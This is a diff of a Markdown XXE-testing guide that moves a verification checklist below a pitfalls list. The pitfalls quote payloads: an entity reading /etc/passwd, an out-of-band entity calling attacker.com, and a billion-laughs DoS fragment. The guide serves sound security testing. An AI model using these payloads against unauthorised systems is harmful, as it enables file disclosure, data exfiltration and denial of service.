@@ -433,20 +433,20 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 ---
 
-## Verification
-
-- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
-- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
-- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
-
----
-
 ## Pitfalls
 - **XXE in SVG upload** — SVG files are XML. XXE in uploaded SVG is a valid attack vector. Test with SVG containing `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
 - **XXE with no output (blind XXE)** — if the parser doesn't return entity values, use OOB XXE (`<!ENTITY xxe SYSTEM "http://attacker.com/">`) to trigger callbacks.
 - **XXE in SOAP/WSDL** — SOAP endpoints are often overlooked for XXE. Test all SOAP operations.
 - **XML parser configuration** — `libxml_disable_entity_loader(true)` in PHP, `XMLConstants.FEATURE_SECURE_PROCESSING` in Java block XXE. Test DTDs specifically.
 - **Billion laughs attack** — exponential entity expansion DoS (`<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">` ...) is an XXE variant. Rate as DoS, not information disclosure.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
